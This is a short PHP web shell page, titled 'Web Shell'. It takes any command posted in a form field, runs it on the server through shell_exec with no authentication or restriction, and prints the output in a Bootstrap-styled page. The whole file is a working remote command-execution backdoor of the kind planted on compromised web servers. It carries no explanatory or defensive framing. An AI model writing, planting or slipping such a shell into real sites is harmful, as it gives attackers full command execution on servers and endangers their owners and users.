<?php
if (!empty($_POST['cmd'])) {
    $cmd = shell_exec($_POST['cmd']);
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
    <link rel="stylesheet" type="text/css"
          href="http://cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css">
    <title>Web Shell</title>
    <style>
        pre {
            padding: 10px;
            -webkit-border-radius: 5px;
            -moz-border-radius: 5px;
            border-radius: 5px;
            background-color: #DDDDDD;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="pb-0 mt-4 mb-0">
        <form method="POST">
            <div class="form-group">
                <label for="cmd"><strong>Command :</strong></label>
                <input type="text" class="form-control" name="cmd" id="cmd"
                       value="<?= htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8') ?>" required>
                <!--<input type="reset" class="btn btn-warning" value="Reset">-->
                <a href="./" class="btn btn-warning" role="button">Clear</a>
                <a href="../" class="btn btn-link" role="button">Parent Directory</a>
                <button type="submit" class="btn btn-primary pull-right">Run</button>
            </div>
        </form>
        <?php if ($cmd): ?>
            <pre><?= htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8') ?></pre>
        <?php elseif (!$cmd && $_SERVER['REQUEST_METHOD'] == 'POST'): ?>
            <pre>[NO RESULT]</pre>
        <?php endif; ?>
    </div>
</div>
</body>
</html>
